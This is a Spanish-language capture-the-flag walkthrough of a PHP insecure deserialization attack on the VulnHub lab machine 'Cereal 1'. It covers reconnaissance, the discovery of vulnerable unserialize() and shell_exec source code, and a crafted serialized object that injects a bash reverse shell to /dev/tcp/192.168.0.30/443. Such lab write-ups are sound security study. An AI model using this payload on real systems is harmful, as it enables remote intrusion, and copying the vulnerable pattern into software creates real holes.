Un ataque de deserialización es una vulnerabilidad de seguridad que ocurre cuando una aplicación deserializa (convierte en objeto) datos provenientes de una fuente externa, como una solicitud de red o un archivo. Esta vulnerabilidad puede ser explotada por un atacante malintencionado para ejecutar código malicioso o manipular datos en la aplicación objetivo.

-------------------

Para esta vulnerabilidad vamos a practicar con la máquina cereal 1 de vulnhub:
![[Pasted image 20240612162458.png]]

Hacemos un escaneo con nmap, donde nos fijaremos en lo que corre por la web:
![[Pasted image 20240612162508.png]]

Esta es la web:
![[Pasted image 20240612162518.png]]

Hacemos fuzzing, donde tenemos el directorio /blog y /admin:
![[Pasted image 20240612162523.png]]

Vemos que la web en el directorio /blog no se ve correctamente:
![[Pasted image 20240612162531.png]]

Y esto es debido a que es posible que se esté aplicando virtual hosting, por lo que miramos el código fuente y vemos que los recursos los está intentando cargar de un cereal.cft:
![[Pasted image 20240612162536.png]]

Por lo que tenemos que añadirlo al /etc/hosts:
![[Pasted image 20240612162540.png]]

Y ahora ya se ve bien:
![[Pasted image 20240612162547.png]]

Ahora si miramos el otro puerto 44441 que también corría un servicio HTTP, vemos que nos sale lo siguiente:
![[Pasted image 20240612162552.png]]

Y dentro de este puerto vamos a buscar subdominios y añadimos el que nos encontró:
```bash
gobuster vhost -u http://cereal.ctf:44441/ -w subdomains-top1million-5000.txt 
```

![[Pasted image 20240612162558.png]]

Y accedemos a este panel:
![[Pasted image 20240612162603.png]]

Podemos probar si se ejecuta de verdad un ping poniéndonos en escucha con tcpdump con este parámetro y vemos que hay conectividad:
```bash
tcpdump -i eth0 -n
```

![[Pasted image 20240612162614.png]]

Vamos a volver a ejecutar un ping pero interceptamos la petición con burpsuite:
![[Pasted image 20240612162621.png]]

Y tenemos un objeto con información:
![[Pasted image 20240612162632.png]]

Pero esa data viene url encodeada, para decodificarla podemos presionar control + shift + u:
![[Pasted image 20240612162647.png]]

Ahora en este punto, hay un directorio dentro de la máquina donde podemos ver cómo se efectúa esta deserialización por detrás, por tanto para encontrar esta ubicación podemos usar gobuster nuevamente pero con un diccionario mucho más grande:

Y esta es la ubicación donde no tenemos permisos:
![[Pasted image 20240612162653.png]]

Pero ahora podemos hacer búsqueda por extensiones de archivos, donde tras ir probando extensiones, nos encontramos el /index.php.bak:
![[Pasted image 20240612162700.png]]

Y nos encontramos con esto:
![[Pasted image 20240612162706.png]]

Y si miramos el código fuente, podemos acceder a cómo se tramita la deserialización por detrás:
```php
<?php

class pingTest {
	public $ipAddress = "127.0.0.1";
	public $isValid = False;
	public $output = "";

	function validate() {
		if (!$this->isValid) {
			if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
			{
				$this->isValid = True;
			}
		}
		$this->ping();

	}

	public function ping()
        {
		if ($this->isValid) {
			$this->output = shell_exec("ping -c 3 $this->ipAddress");	
		}
        }

}

if (isset($_POST['obj'])) {
	$pingTest = unserialize(urldecode($_POST['obj']));
} else {
	$pingTest = new pingTest;
}

$pingTest->validate();

echo "<html>
<head>
<script src=\"http://secure.cereal.ctf:44441/php.js\"></script>
<script>
function submit_form() {
		var object = serialize({ipAddress: document.forms[\"ipform\"].ip.value});
		object = object.substr(object.indexOf(\"{\"),object.length);
		object = \"O:8:\\\"pingTest\\\":1:\" + object;
		document.forms[\"ipform\"].obj.value = object;
		document.getElementById('ipform').submit();
}
</script>
<link rel='stylesheet' href='http://secure.cereal.ctf:44441/style.css' media='all' />
<title>Ping Test</title>
</head>
<body>
<div class=\"form-body\">
<div class=\"row\">
    <div class=\"form-holder\">
	<div class=\"form-content\">
	    <div class=\"form-items\">
		<h3>Ping Test</h3>
		
		<form method=\"POST\" action=\"/\" id=\"ipform\" onsubmit=\"submit_form();\" class=\"requires-validation\" novalidate>

		    <div class=\"col-md-12\">
			<input name=\"obj\" type=\"hidden\" value=\"\">
		       <input class=\"form-control\" type=\"text\" name=\"ip\" placeholder=\"IP Address\" required>
		    </div>
		<br />
		    <div class=\"form-button mt-3\">
			<input type=\"submit\" value=\"Ping!\">
			<br /><br /><textarea>$pingTest->output</textarea>
		    </div>
		</form>
	    </div>
	</div>
    </div>
</div>
</div>
</body>
</html>";

?>
```

![[Pasted image 20240612162719.png]]
Y aquí en esta parte podemos ver cómo se valida que el input sea una IP y no se pueda colar ningún otro comando; pero nuestro objetivo es poder insertar un comando dentro de la variable ipAddress:
![[Pasted image 20240612162723.png]]

Por tanto vamos a crear un nuevo fichero con la data del principio manipulada para después serializarlo y colarlo en burp suite para ejecutar un comando de forma remota:
```php
<?php

class pingTest {
        public $ipAddress = "; bash -c 'bash -i >& /dev/tcp/192.168.0.30/443 0>&1'";
        public $isValid = True;
        public $output = "";
}

echo urlencode(serialize(new pingTest));
```

![[Pasted image 20240612162732.png]]
Si lo ejecutamos, gracias al echo del final, tendremos el texto deserializado:
![[Pasted image 20230711121239.png]]
Por tanto volvemos a la ventana del principio e interceptamos nuevamente la petición:
![[Pasted image 20240612162737.png]]

![[Pasted image 20240612162746.png]]

Si pegamos en la última línea el código serializado de antes con el código malicioso, lograremos ejecutar un comando de forma remota, y por tanto obtener una reverse shell:
![[Pasted image 20240612162813.png]]

![[Pasted image 20240612162816.png]]

Si lo ejecutamos, obtenemos una reverse shell:

![[Pasted image 20240612162825.png]]